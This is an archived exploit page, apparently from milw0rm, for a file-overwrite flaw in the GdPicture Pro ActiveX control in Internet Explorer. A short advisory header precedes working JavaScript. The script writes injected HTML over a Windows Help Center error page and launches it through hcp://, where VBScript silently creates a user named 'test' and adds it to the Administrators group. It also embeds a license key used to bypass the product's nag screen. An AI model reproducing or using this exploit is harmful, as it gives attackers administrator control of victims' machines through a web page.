<html><head><title>GdPicture Pro ActiveX (gdpicture4s.ocx) File Overwrite / Exec Exploit</title></head><pre>&lt;!--

	---------------------------------------------------------------------------------
	GdPicture Pro ActiveX (gdpicture4s.ocx) Remote File Overwrite / Execution Exploit
	---------------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.gdpicture.com/
	ProgID...: GdPicture4S.Imaging
	
	Description:
	
	SaveAsPDF() method allow to create / overwrite file through
	sFilePath argument. By using other arguments, such as sTitle,
	an attacker could be inject html code and execute it using
	the hcp:// protocol (tecnique discovered by rgod).
	Also GdPicturePro5.Imaging is prone to this vulnerability,
	but it doesn't implements the IObjectSafety interface.
	
	Tested on Windows XP SP2 with IE 6/7
	
	Object safety report:
	
	Report for Clsid: {E8512363-3581-42EF-A43D-990E7935C8BE}
	RegKey Safe for Script: False
	RegKey Safe for Init: False
	Implements IObjectSafety: True
	IDisp Safe:  Safe for untrusted: caller,data  
	IPStorage Safe:  Safe for untrusted: caller,data

	[*] A special thanks goes to shinnai, for his patience :)

--&gt;

&lt;object classid='clsid:E8512363-3581-42EF-A43D-990E7935C8BE' id='test'&gt;&lt;/object&gt;

&lt;script language='javascript'&gt;

	var cmd = &quot;cmd /c net user test test /add &amp; net localgroup Administrators test /add&quot;;

	var outFile = &quot;c:\\windows\\pchealth\\helpctr\\system\\errors\\badurl.htm&quot;;

	var BMP = &quot;\x42\x4d\x42\x00\x00\x00\x00\x00\x00\x00\x3e&quot; +
		  &quot;\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00&quot; +
		  &quot;\x01\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00&quot; +
		  &quot;\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot; +
		  &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot; +
		  &quot;\x00\x00\x00\xff\xff\xff\x00\x80\x00\x00\x00&quot;;

	var sc = &quot;&lt;object classid='clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8' id='wsh'&gt;&lt;\/object&gt;&quot; +
		 &quot;&lt;script language='vbscript'&gt;wsh.Run \&quot;&quot; + cmd + &quot;\&quot;, SW_HIDE&lt;\/script&gt;&quot;;

	test.SetLicenseNumber(&quot;0317955669879948884162456&quot;); // only to avoid the nag screen
	test.CreateImageFromString(BMP);

	if (test.SaveAsPDF(outFile, sc, &quot;&quot;, &quot;&quot;, &quot;&quot;)) location.href = &quot;hcp://system/errors/badurl.htm&quot;;

&lt;/script&gt;

# milw0rm.com [2008-09-30]</pre></html>